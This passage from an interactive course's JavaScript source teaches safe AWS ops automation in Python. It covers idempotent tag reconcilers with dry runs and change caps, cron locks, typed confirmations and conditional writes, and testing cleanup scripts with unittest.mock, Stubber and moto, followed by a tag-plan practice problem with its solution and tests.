      <p>🔵 <b>Idempotency at the API level.</b> Many AWS create calls accept a <code>ClientToken</code> (EC2 <code>run_instances</code>, EFS, ...): retrying with the same token returns the original result instead of creating a second resource. Tagging is naturally idempotent: <code>create_tags</code> with the same key and value again is a no-op in effect. Deleting something already gone (<code>NotFound</code>) should count as success for a cleanup.</p>`,
    clues: [
      '"the script must be safe to re-run" / "it runs from cron every hour" → reconcile: observe, diff, apply only the difference',
      '"ensure every resource has tag X" → plan of missing/wrong tags, then <code>create_tags</code> only for those',
      '"it deleted more than expected" → dry run by default, <code>--yes</code>, account guard, <code>--max-changes</code> circuit breaker',
      '"two runs overlapped and double-processed" → <code>fcntl.flock</code> with <code>LOCK_EX | LOCK_NB</code>',
      '"the job crashed halfway" → every step idempotent, so the next run resumes naturally',
      '"retry created two instances" → <code>ClientToken</code> / idempotency key'
    ],
    code: [{ lang: 'python', run: true, code: R`"""ensure_tags.py - make sure every instance has the required tags. Reconciler over a fake inventory.
Dry run by default; --apply --yes to change. Safe to run from cron: a second run finds nothing to do.
"""
import argparse
import logging
import sys

log = logging.getLogger("ensure_tags")

REQUIRED = {"Owner": "platform-team", "CostCenter": "cc-1042"}   # desired state (from config in real life)
ENFORCE = {"CostCenter"}          # these must match exactly; others are only filled in when missing


class FakeEC2:
    """Just enough of the EC2 API for the demo: describe and create_tags."""

    def __init__(self):
        self.instances = {
            "i-0a1": {"Name": "web-01", "Owner": "team-web"},
            "i-0b2": {"Name": "web-02"},
            "i-0c3": {"Name": "db-01", "Owner": "team-db", "CostCenter": "cc-0001"},
            "i-0d4": {"Name": "bastion", "Owner": "platform-team", "CostCenter": "cc-1042"},
        }
        self.api_writes = 0

    def describe(self):
        return {iid: dict(tags) for iid, tags in self.instances.items()}

    def create_tags(self, Resources, Tags):
        self.api_writes += 1
        for iid in Resources:
            for t in Tags:
                self.instances[iid][t["Key"]] = t["Value"]


def plan(inventory):
    """Pure: return [(instance, key, old, new)] for every tag that must change."""
    changes = []
    for iid, tags in sorted(inventory.items()):
        for key, want in REQUIRED.items():
            have = tags.get(key)
            if have is None or (key in ENFORCE and have != want):
                changes.append((iid, key, have, want))
    return changes


def run(ec2, argv):
    p = argparse.ArgumentParser()
    p.add_argument("--apply", action="store_true")
    p.add_argument("--yes", action="store_true")
    p.add_argument("--max-changes", type=int, default=20)
    args = p.parse_args(argv)
    if args.apply and not args.yes:
        p.error("--apply needs --yes")
    changes = plan(ec2.describe())
    if not changes:
        log.info("nothing to do: all instances compliant")
        return 0
    if len(changes) > args.max_changes:
        log.error("plan has %d changes > --max-changes %d; refusing", len(changes), args.max_changes)
        return 3
    for iid, key, old, new in changes:
        log.info("%s %s %s: %s -> %s", "SET" if args.apply else "WOULD SET", iid, key, old, new)
        if args.apply:
            ec2.create_tags(Resources=[iid], Tags=[{"Key": key, "Value": new}])
    log.info("%d change(s) %s", len(changes), "applied" if args.apply else "planned (dry run)")
    return 0


logging.basicConfig(level=logging.INFO, format="%(message)s", stream=sys.stdout)
ec2 = FakeEC2()
print("== run 1: dry run"); run(ec2, [])
print("== run 2: tiny safety cap"); print("exit code", run(ec2, ["--apply", "--yes", "--max-changes", "2"]))
print("== run 3: apply"); run(ec2, ["--apply", "--yes"])
print("== run 4: again (idempotent)"); run(ec2, ["--apply", "--yes"])
print("API writes:", ec2.api_writes, "| i-0a1 tags:", ec2.instances["i-0a1"])
# Output:
# == run 1: dry run
# WOULD SET i-0a1 CostCenter: None -> cc-1042
# WOULD SET i-0b2 Owner: None -> platform-team
# WOULD SET i-0b2 CostCenter: None -> cc-1042
# WOULD SET i-0c3 CostCenter: cc-0001 -> cc-1042
# 4 change(s) planned (dry run)
# == run 2: tiny safety cap
# plan has 4 changes > --max-changes 2; refusing
# exit code 3
# == run 3: apply
# SET i-0a1 CostCenter: None -> cc-1042
# SET i-0b2 Owner: None -> platform-team
# SET i-0b2 CostCenter: None -> cc-1042
# SET i-0c3 CostCenter: cc-0001 -> cc-1042
# 4 change(s) applied
# == run 4: again (idempotent)
# nothing to do: all instances compliant
# API writes: 4 | i-0a1 tags: {'Name': 'web-01', 'Owner': 'team-web', 'CostCenter': 'cc-1042'}` }, { lang: 'python', run: true, code: R`"""Cron safety: a non-blocking lock so two runs never overlap (Linux/macOS; fcntl is POSIX-only)."""
import fcntl
import os
import sys
import tempfile

LOCK_PATH = os.path.join(tempfile.gettempdir(), "ensure_tags.demo.lock")   # real job: /run/lock/ensure_tags.lock


def acquire(path):
    """Return an open file holding an exclusive lock, or None if another run holds it."""
    f = open(path, "w")
    try:
        fcntl.flock(f, fcntl.LOCK_EX | fcntl.LOCK_NB)      # NB = do not wait
    except BlockingIOError:
        f.close()
        return None
    f.write(str(os.getpid()))
    f.flush()
    return f                                             # keep it open: closing (or dying) releases the lock


first = acquire(LOCK_PATH)
print("run A got the lock:", first is not None)
second = acquire(LOCK_PATH)                              # a separate open() conflicts, like a second cron run
print("run B got the lock:", second is not None, "-> exits 0 with 'already running'")
first.close()                                            # run A finishes
third = acquire(LOCK_PATH)
print("run C after A finished:", third is not None)
third.close()
sys.exit(0)
# Output:
# run A got the lock: True
# run B got the lock: False -> exits 0 with 'already running'
# run C after A finished: True` }],
    codeTitle: ['Runnable: an ensure-tags reconciler with dry run, confirmation and a change cap', 'Runnable: a cron-safe lock with fcntl.flock'],
    viz: [{
      title: 'Reconcile: desired vs current, then a second run',
      input: 'Name=web-01, Env=dev | Env=prod, Owner=team-a',
      inputLabel: 'current tags | desired tags  (key=value, comma-separated)',
      gen: function (input) {
        var parts = String(input || '').split('|');
        if (parts.length !== 2) throw new Error('Format: current tags | desired tags, e.g. Name=web, Env=dev | Env=prod');
        function parse(s) {
          var m = {}, keys = [];
          csv(s).forEach(function (kv) {
            var i = kv.indexOf('=');
            if (i <= 0) throw new Error('Each tag needs key=value: "' + kv + '"');
            var k = kv.slice(0, i).trim(); if (!(k in m)) keys.push(k); m[k] = kv.slice(i + 1).trim();
          });
          if (keys.length > 8) throw new Error('At most 8 tags per side');
          return { m: m, keys: keys };
        }
        var cur = parse(parts[0]), des = parse(parts[1]);
        var state = Object.assign({}, cur.m), planRows = [], f = [];
        function ent(o) { return Object.keys(o).sort().map(function (k) { return [k, o[k]]; }); }
        f.push({ narr: 'Two inputs: what the instance <b>has</b> (observed through the API) and what it <b>should have</b> (from config). The reconciler never runs "add tag" blindly; it compares first.', parts: [
          { type: 'map', label: 'current', entries: ent(cur.m) },
          { type: 'map', label: 'desired', entries: ent(des.m) }
        ] });
        des.keys.slice().sort().forEach(function (k) {
          var have = cur.m[k], want = des.m[k], act, cls;
          if (have === undefined) { act = 'add ' + k + '=' + want; cls = 'ok'; }
          else if (have !== want) { act = 'update ' + k + ': ' + have + ' -> ' + want; cls = 'cur'; }
          else { act = null; cls = 'done'; }
          if (act) planRows.push([k, have === undefined ? '(missing)' : have, want, act]);
          f.push({ narr: 'Key <b>' + H.esc(k) + '</b>: has <code>' + H.esc(have === undefined ? '(missing)' : have) + '</code>, wants <code>' + H.esc(want) + '</code>. ' + (act ? 'Plan: <b>' + H.esc(act) + '</b>.' : 'Already correct, so <b>no action</b>. This is the part that makes re-runs safe.'), parts: [
            { type: 'map', label: 'current', entries: ent(cur.m), hl: one(k, cls) },
            { type: 'table', label: 'plan', columns: ['key', 'has', 'wants', 'action'], rows: planRows.length ? planRows.slice() : [['-', '-', '-', '(nothing yet)']] }
          ] });
        });
        var extra = cur.keys.filter(function (k) { return !(k in des.m); });
        if (extra.length) f.push({ narr: 'Keys we do not manage (<b>' + extra.map(H.esc).join(', ') + '</b>) are <b>left alone</b>. Removing tags you did not set is "prune" mode: powerful, but only safe with a strict allow-list and never for <code>aws:</code> tags.', parts: [
          { type: 'map', label: 'current', entries: ent(cur.m), hl: (function () { var h = {}; extra.forEach(function (k) { h[k] = 'sel'; }); return h; })() }
        ] });
        planRows.forEach(function (r) { state[r[0]] = r[2]; });
        f.push({ narr: (planRows.length ? 'Dry run prints these <b>' + planRows.length + '</b> change(s). With <code>--apply --yes</code> it sends them (one <code>create_tags</code> call can carry several tags).' : 'Plan is empty: the instance is already compliant, so no API write happens at all.') + ' After applying, the observed state equals the desired state for every managed key.', parts: [
          { type: 'map', label: 'after apply', entries: ent(state), hl: (function () { var h = {}; planRows.forEach(function (r) { h[r[0]] = 'ok'; }); return h; })() }
        ] });
        f.push({ narr: '<b>Second run</b> (cron, an hour later): observe again, compare again: every key matches, so the plan is empty and the script logs "nothing to do". Same input, same end state, zero writes: ' + H.c('g', 'idempotent') + '.', parts: [
          { type: 'map', label: 'current (run 2)', entries: ent(state) },
          { type: 'table', label: 'plan (run 2)', columns: ['key', 'has', 'wants', 'action'], rows: [['-', '-', '-', '(empty: nothing to do)']] }
        ] });
        return pad4(f, 'Add some tags on either side of the | to see a real plan.');
      }
    }],
    examples: [
      { title: 'The cron job that sent the same report three times', html: `<p>A Python job emailed finance a daily cost report, then wrote <code>last_sent=2026-10-18</code> to a state file. One night the mail server was slow; the job hit its timeout <b>after</b> sending but <b>before</b> writing the state file, so the 03:00 retry sent it again, and so did 04:00. Fix: make "send" idempotent by keying on the report date. Check "was the report for 2026-10-18 sent?" (state written atomically right after a confirmed send, or a sent-marker object in S3 with a conditional put), and take a lock so retries cannot overlap.</p>
        ${H.table(['Step', 'Before', 'After'], [['check', 'none', '"report for D already sent?" → exit 0'], ['send', 'always', 'only if not sent'], ['record', 'after everything', 'atomically, right after the confirmed send'], ['overlap', 'possible', '<code>flock</code> lock']])}` },
      { title: 'A typed confirmation for very dangerous runs', html: `<p>For truly destructive tools (wiping a test account, deleting a whole bucket), <code>--yes</code> may be too easy to copy from shell history. Make the operator <b>type the target</b>, like GitHub does when you delete a repository. Non-interactive runs (cron, CI) must pass the exact value as a flag instead, which still forces a conscious choice.</p>`, code: R`import sys


def confirm_target(expected: str, provided_flag: str = None) -> bool:
    """True only if the operator typed (or passed) the exact target, e.g. the account id."""
    if provided_flag is not None:                       # non-interactive: --confirm-account 123456789012
        return provided_flag == expected
    if not sys.stdin.isatty():                          # no terminal and no flag: refuse
        return False
    answer = input(f"This deletes resources in account {expected}. Type the account id to continue: ")
    return answer.strip() == expected


# usage in main():
#   if args.apply and not confirm_target(account, args.confirm_account):
#       log.error("confirmation failed; nothing changed")
#       return 2` },
      { title: 'Idempotent creates: check first, or let the API do it', html: `<p>Two ways to make "create" safe to repeat. <b>Look before you create</b>: fine when only one copy of the script runs at a time. <b>Let the API enforce it</b>: a <code>ClientToken</code>, an S3 conditional write (<code>IfNoneMatch="*"</code> on <code>put_object</code>), or a DynamoDB <code>ConditionExpression="attribute_not_exists(pk)"</code>. The second also holds when two runs race each other.</p>`, code: R`import boto3
from botocore.exceptions import ClientError

s3 = boto3.Session(profile_name="sandbox").client("s3")


def mark_report_sent(day: str) -> bool:
    """Create the 'sent' marker only if it does not exist yet. True = we are the first."""
    try:
        s3.put_object(Bucket="ops-state-123456789012", Key=f"cost-report/sent/{day}",
                      Body=b"sent", IfNoneMatch="*")       # conditional write: fails if the key exists
        return True
    except ClientError as e:
        if e.response["Error"]["Code"] in ("PreconditionFailed", "ConditionalRequestConflict"):
            return False                                   # someone (an earlier run) already did it
        raise` }
    ],
    deepDive: `<p>🟣 <b>Check-then-act races.</b> "If the tag is missing, add it" is safe when there is only one writer. With two writers (two cron hosts, a human in the console), the check and the act can interleave. For tags the outcome is still fine (last writer wins with the same value). For creates and deletes it is not: use API-level guards (ClientToken, conditional writes, resource-level locks), or run the job in exactly one place (a single scheduled ECS task, an EventBridge Scheduler target, a Kubernetes CronJob with <code>concurrencyPolicy: Forbid</code>).</p>
      <p><b>Locks on one host vs many.</b> <code>fcntl.flock</code> is per machine and released automatically when the process dies, which is what you want for cron. It does not work across hosts or reliably on network filesystems. For a fleet, use a lease: a DynamoDB item with a conditional write and an expiry time, so a crashed holder's lease runs out.</p>
      <p><b>Plan files.</b> For big or risky changes, split the tool: <code>plan</code> writes the change list to a JSON file, a human reviews it (or a pull request does), and <code>apply plan.json</code> executes exactly that list after checking each item is still valid (resource exists, state unchanged). This is Terraform's saved-plan idea, and it makes audits easy.</p>
      <p><b>Convergence and drift.</b> A reconciler that runs often keeps fixing drift (someone removed a tag by hand). That is good, but it can also <b>fight</b> another system that manages the same thing (Terraform setting different tags, AWS Backup adding its own). Decide one owner per attribute, and log changes so a fight shows up as "changed the same tag 24 times today".</p>
      <p><b>Failures in the middle.</b> Apply changes one resource at a time (or in small batches), record successes, keep going on per-item errors, and exit non-zero at the end. Never stop at the first error and leave no record: the next run would still be correct thanks to reconciliation, but nobody would know what failed.</p>`,
    aiEra: `<p>🤖 <b>What AI changes:</b> assistants are good at turning "make sure X is always true" into a reconcile loop, and they can propose the safety scaffolding (dry run, confirmations, change caps) if you ask for it explicitly. AI agents that act on infrastructure are themselves the best argument for idempotent tools: an agent will retry, so the tool must be safe to call twice.</p>
      <p><b>Where it goes wrong:</b> by default, generated scripts tend to "just do it": delete in a loop, no dry run, no confirmation, no cap, and retries that are not idempotent. An agent told to "clean up unused snapshots" may also decide what "unused" means on its own. <b>Your job:</b> give automation (human-written or AI-written) the same contract: dry run by default, a printed plan, explicit confirmation, an account guard, a maximum number of changes, and least-privilege IAM. When an agent can call your tool, expose the <b>plan</b> step freely and put the <b>apply</b> step behind human approval.</p>`,
    problems: [P({
      t: 'Compute a tag reconcile plan', l: 'Medium', tags: ['idempotency', 'reconciler', 'tags', 'pure function'], co: ['HashiCorp', 'Amazon', 'Swiggy'], c: PURE,
      s: `<p>Write <code>tag_plan(current, desired, prune)</code> for an ensure-tags tool. Both lists contain tags as <code>"Key=Value"</code> strings; split on the <b>first</b> <code>=</code> only (values may contain <code>=</code>). Keys are case-sensitive. Return the needed actions, <b>sorted by key</b> (plain string order):</p>
        <ul><li><code>"add K=V"</code> when K is desired but missing;</li>
        <li><code>"update K: OLD -&gt; NEW"</code> when K exists with a different value;</li>
        <li><code>"remove K"</code> when <code>prune</code> is true and K exists but is not desired, <b>except</b> keys starting with <code>aws:</code>, which belong to AWS and are never removed.</li></ul>
        <p>Keys whose value already matches produce nothing. A compliant resource returns an empty list.</p>`,
      ex: `<p><code>tag_plan(["Name=web-01", "Env=dev"], ["Env=prod", "Owner=team-a"], True)</code> → ${H.c('g', '["update Env: dev -&gt; prod", "remove Name", "add Owner=team-a"]')}. Sorted keys: Env, Name, Owner. With <code>prune=False</code> the Name line disappears.</p>`,
      bw: `<p>Sending every desired tag on every run ("just call create_tags with all of them"). For tags the end state happens to be correct, but every run writes, so CloudTrail fills with noise, you cannot show a meaningful dry run, and you cannot tell "changed 0" from "changed 500". It also cannot express removals at all.</p>`,
      bc: `def tag_plan(current, desired, prune):
    return ["add " + t for t in desired]          # always "adds", even when nothing differs`,
      q: ['Why should a reconciler never prune tags starting with <code>aws:</code>?', ['They are reserved and managed by AWS services; you cannot (and must not) edit them', 'They are case-insensitive', 'They are free of charge', 'They are only visible in the console'], 0, 'aws: prefixed tags (CloudFormation stack names, Backup source, etc.) are created by AWS and cannot be modified or deleted through the tagging APIs. Treating them as unmanaged extras would make every run fail.'],
      h: ['<p>Hint 1: turn both lists into dicts with <code>dict(t.split("=", 1) for t in tags)</code>; the <code>1</code> keeps <code>=</code> inside values.</p>', '<p>Hint 2: walk over <code>sorted(set(cur) | set(des))</code> so the output order is stable and every key is seen once.</p>', '<p>Hint 3: per key: desired and missing → add; desired and different → update; not desired, prune on and not <code>aws:</code> → remove; anything else → nothing.</p>'],
      a: `<p>Parse both sides into dicts (splitting on the first <code>=</code>), then visit the union of keys in sorted order and classify each key into add, update, remove or nothing. Sorting makes the plan deterministic, so dry-run output can be diffed and tested. Prune is opt-in and skips <code>aws:</code> keys. The same function serves the dry run (print the list) and the apply step (turn adds and updates into one <code>create_tags</code> call, removals into <code>delete_tags</code>), so what you reviewed is exactly what runs.</p>`,
      code: `def tag_plan(current, desired, prune):
    """Actions that turn the current tags into the desired ones, sorted by key."""
    cur = dict(t.split("=", 1) for t in current)
    des = dict(t.split("=", 1) for t in desired)
    actions = []
    for key in sorted(set(cur) | set(des)):
        if key in des:
            if key not in cur:
                actions.append(f"add {key}={des[key]}")
            elif cur[key] != des[key]:
                actions.append(f"update {key}: {cur[key]} -> {des[key]}")
        elif prune and not key.startswith("aws:"):
            actions.append(f"remove {key}")
    return actions`,
      cx: `<p>O((c + d) log(c + d)) for c current and d desired tags, dominated by sorting the keys. Tags per resource are capped at 50 in AWS, so this is instant.</p>`,
      f: ['How would you turn the plan into the fewest API calls (one <code>create_tags</code> and one <code>delete_tags</code> per resource)?', 'Some tags should only be filled in when missing, never overwritten. How would you mark that in the desired state?'],
      tests: { sig: 'string[] string[] bool -> string[]', fn: 'tagPlan', cases: [
        [[['Name=web-01', 'Env=dev'], ['Env=prod', 'Owner=team-a'], false], ['update Env: dev -> prod', 'add Owner=team-a']],
        [[['Name=web-01', 'Env=dev'], ['Env=prod', 'Owner=team-a'], true], ['update Env: dev -> prod', 'remove Name', 'add Owner=team-a']],
        [[['Owner=team-a', 'Env=prod'], ['Env=prod', 'Owner=team-a'], true], []],
        [[[], ['Owner=team-a', 'CostCenter=cc-1'], false], ['add CostCenter=cc-1', 'add Owner=team-a']],
        [[['aws:cloudformation:stack-name=web', 'Temp=1'], [], true], ['remove Temp']],
        [[['Url=a=b'], ['Url=a=c'], false], ['update Url: a=b -> a=c']],
        [[['env=prod'], ['Env=prod'], true], ['add Env=prod', 'remove env']],
        [[['A=1', 'B=2'], [], false], []]
      ] }
    })]
  });

  // ───────────────────────── Topic 7: testing automation scripts ─────────────────────────
  topics.push({
    title: 'Testing Automation Scripts: pytest, Fakes, unittest.mock, Stubber and moto',
    analogy: `<p>You would not test a fire alarm by setting the office on fire. You press the <b>test button</b>, or hold up a little smoke spray. Testing automation is the same: you do not delete real snapshots to see whether the cleanup script works. You give it a <b>pretend AWS</b>. A hand-made <b>fake</b> is a cardboard model of the building. <b>Stubber</b> is a script for an actor: "when they ask for the snapshot list, say <i>this</i>; when they try to delete snap-2, say <i>it is in use</i>". <b>moto</b> is a full film set: a pretend AWS that remembers what you created, so you can check what is left at the end.</p>`,
    explain: `<p>🟢 <b>Why test a script at all?</b> Ops scripts delete, terminate and overwrite. The bugs that hurt are logic bugs: a wrong date comparison, a missing page, a filter that matches everything, a dry run that is not really dry. These are cheap to catch in tests and very expensive to catch in production.</p>
      <p>🟢 <b>Design for testing first.</b> The earlier topics already did the hard part: pure functions (<code>plan</code>, <code>stale_snapshots</code>, <code>rotation_plan</code>) that take data and return data. Those need no mocks at all: call them with small inputs and compare outputs. Keep AWS calls in thin functions that take the client as a <b>parameter</b>, so a test can pass in something else.</p>
      ${H.table(['Tool', 'What it is', 'Use it for'], [
        ['<b>pytest</b>', 'test runner: plain <code>assert</code>, fixtures like <code>tmp_path</code>, <code>monkeypatch</code>, <code>caplog</code>', 'every test'],
        ['a hand-written <b>fake</b> class', 'a tiny object with the same methods as the client', 'logic around paginators and retries; zero dependencies'],
        ['<b>unittest.mock</b>', 'stdlib: <code>Mock</code>, <code>patch</code>, <code>call</code> records', 'checking "was delete called with X?"; patching <code>time.sleep</code> or <code>datetime</code>'],
        ['<b>botocore.stub.Stubber</b>', 'sits on a <b>real</b> boto3 client and returns queued responses; checks your parameters', 'exact request/response tests, error codes'],
        ['<b>moto</b>', 'an in-memory fake AWS (<code>@mock_aws</code>) that keeps state', 'end-to-end: create resources, run the script, assert what remains']
      ])}
      <p>🔵 <b>What to test in an ops script:</b> the decision logic (boundaries such as "exactly 30 days"), dry run makes <b>zero</b> write calls, <code>--apply</code> without <code>--yes</code> exits 2, pagination with more than one page, each error code branch (<code>NotFound</code> counts as done, <code>InUse</code> is skipped, <code>AccessDenied</code> stops), and the exit code.</p>
      <p>🔵 <b>Never test against a real account by accident.</b> In test setup, set fake credentials (<code>AWS_ACCESS_KEY_ID=testing</code>) and a region with <code>monkeypatch.setenv</code>, and unset <code>AWS_PROFILE</code>. Then a test that escapes the mock fails with an auth error instead of touching your sandbox.</p>`,
    clues: [
      '"how would you test a script that deletes AWS resources?" → pure decision functions + Stubber or moto; never a real account',
      '"verify the dry run makes no changes" → assert the fake/mock recorded zero write calls',
      '"test the error handling" → <code>stubber.add_client_error("delete_snapshot", service_error_code="InvalidSnapshot.InUse")</code>',
      '"the test is slow because of retries/sleep" → patch <code>time.sleep</code>, inject the sleep function or the clock',
      '"test argparse behaviour" → call <code>main([...])</code> with <code>pytest.raises(SystemExit)</code> and check the code',
      '"integration test of the whole flow" → moto <code>@mock_aws</code>: create, run, assert remaining state'
    ],
    code: [{ lang: 'python', run: true, code: R`"""Tests for snapshot-cleanup logic using only the standard library (unittest + unittest.mock).
With pytest installed you would write the same tests as plain functions with assert.
"""
import io
import unittest
from datetime import datetime, timedelta, timezone
from unittest import mock

NOW = datetime(2026, 10, 19, tzinfo=timezone.utc)


class ClientError(Exception):
    """Same shape as botocore's: e.response['Error']['Code']."""
    def __init__(self, code):
        super().__init__(code)
        self.response = {"Error": {"Code": code, "Message": code}}


def cleanup(ec2, days, apply, now=NOW):
    """Code under test: returns (deleted, skipped). The client is a parameter, so tests can fake it."""
    cutoff = now - timedelta(days=days)
    deleted, skipped = [], []
    token = None
    while True:
        page = ec2.describe_snapshots(OwnerIds=["self"], **({"NextToken": token} if token else {}))
        for s in page["Snapshots"]:
            if s.get("Tags") or s["StartTime"] >= cutoff:
                continue
            if not apply:
                skipped.append(s["SnapshotId"])          # dry run: report only
                continue
            try:
                ec2.delete_snapshot(SnapshotId=s["SnapshotId"])
                deleted.append(s["SnapshotId"])
            except ClientError as e:
                if e.response["Error"]["Code"] == "InvalidSnapshot.NotFound":
                    deleted.append(s["SnapshotId"])      # already gone counts as done
                elif e.response["Error"]["Code"] == "InvalidSnapshot.InUse":
                    skipped.append(s["SnapshotId"])
                else:
                    raise
        token = page.get("NextToken")
        if not token:
            return deleted, skipped


def snap(sid, age_days, tags=None):
    return {"SnapshotId": sid, "StartTime": NOW - timedelta(days=age_days), "Tags": tags or []}


class CleanupTests(unittest.TestCase):
    def make_client(self, pages):
        ec2 = mock.Mock()
        ec2.describe_snapshots.side_effect = pages     # one dict per call, in order
        return ec2

    def test_dry_run_never_deletes(self):
        ec2 = self.make_client([{"Snapshots": [snap("snap-1", 40)]}])
        cleanup(ec2, 30, apply=False)
        ec2.delete_snapshot.assert_not_called()

    def test_boundary_and_tags(self):
        ec2 = self.make_client([{"Snapshots": [snap("snap-old", 31), snap("snap-edge", 30),
                                               snap("snap-tagged", 90, [{"Key": "Owner", "Value": "a"}])]}])
        deleted, _ = cleanup(ec2, 30, apply=True)
        self.assertEqual(deleted, ["snap-old"])

    def test_second_page_is_processed(self):
        ec2 = self.make_client([{"Snapshots": [snap("snap-p1", 50)], "NextToken": "t1"},
                                {"Snapshots": [snap("snap-p2", 50)]}])
        deleted, _ = cleanup(ec2, 30, apply=True)
        self.assertEqual(deleted, ["snap-p1", "snap-p2"])
        ec2.describe_snapshots.assert_called_with(OwnerIds=["self"], NextToken="t1")

    def test_error_codes(self):
        ec2 = self.make_client([{"Snapshots": [snap("a", 40), snap("b", 40), snap("c", 40)]}])
        ec2.delete_snapshot.side_effect = [None, ClientError("InvalidSnapshot.InUse"),
                                           ClientError("InvalidSnapshot.NotFound")]
        self.assertEqual(cleanup(ec2, 30, apply=True), (["a", "c"], ["b"]))

    def test_access_denied_is_not_swallowed(self):
        ec2 = self.make_client([{"Snapshots": [snap("a", 40)]}])
        ec2.delete_snapshot.side_effect = ClientError("UnauthorizedOperation")
        with self.assertRaises(ClientError):
            cleanup(ec2, 30, apply=True)


out = io.StringIO()
result = unittest.TextTestRunner(stream=out, verbosity=2).run(unittest.defaultTestLoader.loadTestsFromTestCase(CleanupTests))
print(out.getvalue().strip().splitlines()[-1], "| ran", result.testsRun, "tests")
# Output:
# OK | ran 5 tests` }, R`"""tests/test_clean_snapshots.py - pytest with Stubber (exact calls) and moto (stateful fake AWS).
pip install pytest boto3 moto   ->   pytest -q
"""
from datetime import datetime, timedelta, timezone

import boto3
import pytest
from botocore.stub import ANY, Stubber
from moto import mock_aws

from opstools.clean_snapshots import main, stale_untagged   # the script from the boto3 topic


@pytest.fixture(autouse=True)
def fake_aws_env(monkeypatch):
    """Make sure no test can ever reach a real account."""
    monkeypatch.delenv("AWS_PROFILE", raising=False)
    monkeypatch.setenv("AWS_ACCESS_KEY_ID", "testing")
    monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "testing")
    monkeypatch.setenv("AWS_DEFAULT_REGION", "eu-west-1")


def test_apply_requires_yes(capsys):
    with pytest.raises(SystemExit) as exc:
        main(["--account", "123456789012", "--region", "eu-west-1", "--apply"])
    assert exc.value.code == 2
    assert "--yes" in capsys.readouterr().err


def test_stale_untagged_with_stubber():
    ec2 = boto3.client("ec2", region_name="eu-west-1")
    old = datetime.now(timezone.utc) - timedelta(days=45)
    new = datetime.now(timezone.utc) - timedelta(days=2)
    with Stubber(ec2) as stub:
        stub.add_response("describe_snapshots",
                          {"Snapshots": [{"SnapshotId": "snap-old", "StartTime": old, "VolumeSize": 8},
                                         {"SnapshotId": "snap-new", "StartTime": new, "VolumeSize": 8}],
                           "NextToken": "page2"},
                          {"OwnerIds": ["self"]})
        stub.add_response("describe_snapshots",
                          {"Snapshots": [{"SnapshotId": "snap-tagged", "StartTime": old, "VolumeSize": 8,
                                          "Tags": [{"Key": "Owner", "Value": "team-db"}]}]},
                          {"OwnerIds": ["self"], "NextToken": "page2"})
        found = [s["SnapshotId"] for s in stale_untagged(ec2, 30)]
        stub.assert_no_pending_responses()          # every queued call was really made
    assert found == ["snap-old"]


def test_in_use_error_with_stubber():
    ec2 = boto3.client("ec2", region_name="eu-west-1")
    with Stubber(ec2) as stub:
        stub.add_client_error("delete_snapshot", service_error_code="InvalidSnapshot.InUse",
                              service_message="snapshot is in use by ami-0abc", expected_params={"SnapshotId": ANY})
        with pytest.raises(ec2.exceptions.ClientError) as exc:
            ec2.delete_snapshot(SnapshotId="snap-1")
    assert exc.value.response["Error"]["Code"] == "InvalidSnapshot.InUse"


@mock_aws
def test_end_to_end_dry_run_keeps_everything():
    ec2 = boto3.client("ec2", region_name="eu-west-1")
    vol = ec2.create_volume(AvailabilityZone="eu-west-1a", Size=8)["VolumeId"]
    ec2.create_snapshot(VolumeId=vol)
    account = boto3.client("sts").get_caller_identity()["Account"]   # moto's fake account id
    assert main(["--account", account, "--region", "eu-west-1", "--days", "1"]) == 0
    assert len(ec2.describe_snapshots(OwnerIds=["self"])["Snapshots"]) == 1`],
    codeTitle: ['Runnable: unit tests with unittest.mock (stdlib only)', 'pytest + botocore Stubber + moto (mock_aws)'],
    viz: [{
      title: 'Stubber: a queue of expected calls',
      input: 'describe_snapshots, delete_snapshot, delete_snapshot',
      inputLabel: 'calls your code makes, in order (describe_snapshots, delete_snapshot, create_tags)',
      gen: function (input) {
        var calls = csv(input);
        var OK = ['describe_snapshots', 'delete_snapshot', 'create_tags'];
        if (!calls.length || calls.length > 8 || calls.some(function (c) { return OK.indexOf(c) < 0; })) throw new Error('Use 1-8 of: describe_snapshots, delete_snapshot, create_tags');
        var queue = ['describe_snapshots → 2 snapshots', 'delete_snapshot(snap-1) → OK', 'delete_snapshot(snap-2) → InvalidSnapshot.InUse'];
        var ops = ['describe_snapshots', 'delete_snapshot', 'delete_snapshot'];
        var f = [];
        f.push({ narr: 'The test queues three expected calls with <code>add_response</code> and <code>add_client_error</code>. Stubber hands them out <b>strictly in order</b> and checks each operation name (and parameters, if you gave them). Nothing goes over the network.', parts: [
          { type: 'queue', label: 'Stubber queue', items: queue.slice(), frontLabel: 'next', backLabel: 'last' },
          { type: 'array', label: 'calls the code will make', values: calls }
        ] });
        var q = queue.slice(), o = ops.slice();
        for (var i = 0; i < calls.length; i++) {
          var hl = {}; for (var j = 0; j < i; j++) hl[j] = 'done';
          if (!q.length) {
            hl[i] = 'bad';
            f.push({ narr: 'Call ' + (i + 1) + ': <code>' + calls[i] + '</code>, but the queue is empty. Stubber raises <code>UnStubbedResponseError</code>: ' + H.c('r', 'the code made a call the test did not expect') + ' (for example a delete during a dry run).', parts: [
              { type: 'queue', label: 'Stubber queue', items: ['(empty)'] }, { type: 'array', label: 'calls', values: calls, hl: hl }
            ] });
            return f;
          }
          if (calls[i] !== o[0]) {
            hl[i] = 'bad';
            f.push({ narr: 'Call ' + (i + 1) + ': <code>' + calls[i] + '</code>, but the next expected call is <code>' + o[0] + '</code>. Stubber raises <code>StubResponseError: Operation mismatch</code>. The test fails and shows exactly where your code went off script.', parts: [
              { type: 'queue', label: 'Stubber queue', items: q.slice(), hl: { 0: 'bad' } }, { type: 'array', label: 'calls', values: calls, hl: hl }
            ] });
            return f;
          }
          hl[i] = /InUse/.test(q[0]) ? 'cur' : 'ok';
          var got = q.shift(); o.shift();
          f.push({ narr: 'Call ' + (i + 1) + ': <code>' + calls[i] + '</code> matches the front of the queue. Stubber returns: <b>' + H.esc(got.split('→ ')[1]) + '</b>' + (/InUse/.test(got) ? ', raised as a real <code>ClientError</code>, so your <code>except</code> branch runs exactly as it would in AWS.' : '.'), parts: [
            { type: 'queue', label: 'Stubber queue', items: q.length ? q.slice() : ['(empty)'] }, { type: 'array', label: 'calls', values: calls, hl: hl }
          ] });
        }
        if (q.length) f.push({ narr: 'The code finished, but <b>' + q.length + '</b> queued response(s) were never used. <code>stub.assert_no_pending_responses()</code> fails: the code skipped calls the test expected, such as the second page or a delete.', parts: [{ type: 'queue', label: 'left in queue', items: q.slice(), hl: { 0: 'bad' } }] });
